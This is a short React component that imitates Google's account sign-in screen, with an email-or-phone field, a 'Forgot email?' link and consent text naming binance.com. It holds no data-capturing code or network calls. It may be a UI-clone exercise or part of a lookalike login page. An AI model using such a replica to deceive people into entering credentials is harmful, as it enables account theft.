export default function GoogleForm() {
    return (
        <div className='flex-col gap-y-2 h-full flex w-full'>

            <form action="" className="flex-col gap-y-2 h-full flex w-full">
                <div className="relative w-full">
                    <input type="text" id="inputField" className="rounded p-[15px] border text-[16px] w-full border-gray-800 text-[#1f1f1f] focus:outline-none focus:border-blue-500 peer" />
                    <label htmlFor="inputField" className="absolute left-3 top-3.5 px-1 bg-white transition-all duration-200 text-[#1f1f1f] peer-focus:-top-2 peer-focus:text-sm peer-focus:text-blue-500 peer-focus:bg-white peer-placeholder-shown:top-2 peer-placeholder-shown:text-base">Email or phone</label>
                </div>
                <div className="w-full font-medium google text-blue-700 text-[15px] flex justify-start items-center">
                    Forgot email?
                </div>
                <div className="text-[15px] text-gray-700 leading-tight mt-9 pr-5">
                    Before using this app, you can review binance.com’s <span className="text-blue-700 font-normal">privacy policy</span>
                    and <span className="text-blue-700 font-normal">terms of service.</span>
                </div>
            </form>

        </div>
    )
}